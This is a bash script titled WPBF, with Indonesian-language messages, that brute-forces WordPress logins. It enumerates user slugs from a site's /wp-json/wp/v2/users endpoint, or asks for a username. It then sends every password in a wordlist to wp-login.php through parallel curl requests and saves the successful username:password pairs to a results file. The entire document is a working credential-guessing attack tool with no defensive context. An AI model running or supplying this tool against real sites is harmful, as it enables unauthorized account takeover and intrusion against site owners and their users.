curl_timeout=20
multithread_limit=10

clear
if [[ -f wpusername.tmp ]]
then
        rm wpusername.tmp
fi
RED='\e[31m'
GRN='\e[32m'
CYN='\e[33m'
CLR='\e[0m'
CYN='\e[0;36m'

function _GetUserWPJSON() {
        Target="${1}";
        UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")');
        echo ""
        if [[ -z ${UsernameLists} ]];
        then
                echo -e "${CYN}INFO: Waduh Gak bisa ketemu nih username nya${CLR}"
        else
                echo -ne > wpusername.tmp
                for Username in ${UsernameLists};
                do
                        echo "INFO: ketemu nih user nya \"${Username}\"..." |lolcat
                        echo "${Username}" >> wpusername.tmp
                done
        fi
}

function _TestLogin() {
        Target="${1}"
        Username="${2}"
        Password="${3}"
        LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
        if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
        then
                echo -e "${CYN}INFO: gagal ${Target} ${Username}:${Password}${CLR}"
        elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
        then
                echo -e "${GRN}[!] ketemu ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
                echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
        else
                echo -e "${CYN}INFO: gagal ${Target} ${Username}:${Password}${CLR}"
        fi
}

figlet WPBF |lolcat
echo '                       .::Code by RIZKI GANZZ ©2023::.' |lolcat

echo -ne "[?] target  "|lolcat
read Target

curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]];
then
        echo -e "${RED}ERROR: gagal faktor muka :v${CLR}"
        exit
fi

echo -ne "[?] file password nya "|lolcat
read PasswordLists

if [[ ! -f ${PasswordLists} ]]
then
        echo -e "${RED}ERROR: yang bener bego file nya kaga ada${CLR}"
        exit
fi

_GetUserWPJSON ${Target}

if [[ -f wpusername.tmp ]]
then
        for User in $(cat wpusername.tmp)
        do
                (
                        for Pass in $(cat ${PasswordLists})
                        do
                                ((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
                                _TestLogin ${Target} ${User} ${Pass} &
                        done
                        wait
                )
        done
else
        echo -e "${CYN}INFO: gak bisa kebaca username nya cug${CLR}"
        echo -ne "[?] isi username nya "|lolcat
        read User

        if [[ -z ${PasswordLists} ]]
        then
                echo -e "${RED}ERROR: Username gk boleh kosong${CLR}"
                exit
        fi
        echo ''
        (
                for Pass in $(cat ${PasswordLists})
                do
                        ((cthread=cthread%multithread_limit)); ((cthread++==0)) && wait
                        _TestLogin ${Target} ${User} ${Pass} &
                done
                wait
        )
fi
echo "INFO: ketemu $(cat wpbf-results.txt | grep ${Target} | sort -nr | uniq | wc -l) username & password in ./wpbf-results.txt"
